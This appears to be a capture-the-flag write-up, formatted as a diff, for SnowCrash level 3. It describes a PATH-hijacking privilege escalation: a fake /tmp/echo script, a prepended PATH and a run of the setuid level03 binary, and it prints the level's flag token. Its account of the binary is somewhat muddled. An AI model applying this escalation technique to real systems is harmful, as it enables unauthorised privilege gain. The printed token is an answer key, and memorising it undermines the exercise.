@@ -1,0 +1,69 @@
+SnowCrash Level 3 Write-up
+===========================
+
+Target: level03@SnowCrash
+
+Objective:
+----------
+The goal of this level was to retrieve the flag by exploiting the permissions and behavior of the executable 'level03'.
+
+Initial Observations:
+---------------------
+1. Listing the directory showed:
+   - The 'level03' executable has the setuid bit set with owner 'flag03':
+     -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+   - Other files are normal shell configuration files (.bashrc, .profile, .bash_logout).
+
+2. Running the executable './level03' directly as the user produced limited functionality:
+   - Commands like 'ls' returned 'Permission denied'.
+   - A 'getflag' command is available internally in the executable.
+
+Exploit Strategy:
+-----------------
+The executable runs with elevated privileges (setuid 'flag03'), but it uses system commands like 'ls' or 'getflag'. Normally, these commands are resolved using the PATH environment variable.
+
+By creating a fake binary in a directory we control (with write permissions), and prepending that directory to the PATH, we can make the executable execute our controlled script instead of the real system command.
+
+Steps Taken:
+------------
+1. Created a shell script to gain a shell:
+    nano /tmp/echo
+    chmod +x /tmp/echo
+
+
+2. Verified the script:
+
+ls -la /tmp/echo
+-rwxrwxr-x 1 level03 level03 20 Feb 22 02:45 /tmp/echo
+
+
+3. Prepended '/tmp' to the PATH variable to prioritize our script:
+
+export PATH=/tmp:$PATH
+
+
+4. Confirmed PATH:
+
+env | grep PATH
+PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+
+5. Ran the vulnerable executable:
+
+./level03
+
+
+6. Inside the elevated shell, ran:
+
+getflag
+
+
+Result:
+-------
+The flag was successfully retrieved:
+Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
+
+Conclusion:
+-----------
+This challenge demonstrates a classic **PATH hijacking** attack in Linux where a setuid executable executes system commands without specifying full paths. 
+By controlling the PATH and providing a malicious command or shell script, privilege escalation to the owner of the executable is possible.
